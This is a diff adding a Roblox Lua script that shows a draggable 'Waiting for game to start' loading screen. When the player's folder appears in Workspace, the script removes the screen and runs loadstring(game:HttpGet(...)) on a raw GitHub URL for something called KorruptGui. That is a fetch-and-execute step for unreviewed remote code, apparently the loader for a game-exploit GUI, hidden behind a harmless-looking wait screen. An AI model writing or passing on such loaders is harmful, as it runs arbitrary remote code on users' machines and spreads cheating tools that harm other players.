@@ -1,0 +1,81 @@
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+--  Create loading screen UI
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Parent = PlayerGui
+loadingGui.Name = "LoadingScreen"
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(0, 120, 255) 
+frame.Parent = loadingGui
+frame.Active = true -- Allows dragging
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 0.5, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 10)
+textLabel.Text = "Waiting for game to start"
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.BackgroundTransparency = 1
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextSize = 18
+textLabel.Parent = frame
+
+-- Dot animation for "Waiting for game to start"
+task.spawn(function()
+    local dots = {"", ".", "..", "..."}
+    local index = 1
+    while loadingGui.Parent do
+        textLabel.Text = "Waiting for game to start" .. dots[index]
+        index = (index % #dots) + 1
+        task.wait(0.5) -- Adjust speed of animation
+    end
+end)
+
+-- Dragging functionality for the UI
+local dragging, startPos, startInputPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        startPos = frame.Position
+        startInputPos = input.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - startInputPos
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+--  Hide loading UI when player folder is found
+local function onFolderFound(folder)
+    print("Player folder found in Workspace!") 
+    loadingGui:Destroy() -- Remove the loading screen
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xRnDxx/KorruptGui/refs/heads/main/GUI"))()
+end
+
+task.spawn(function()
+    local playerFolder
+    repeat
+        task.wait(0.1)
+        playerFolder = Workspace:FindFirstChild("Players") and Workspace.Players:FindFirstChild(player.Name)
+    until playerFolder
+
+    onFolderFound(playerFolder)
+end)
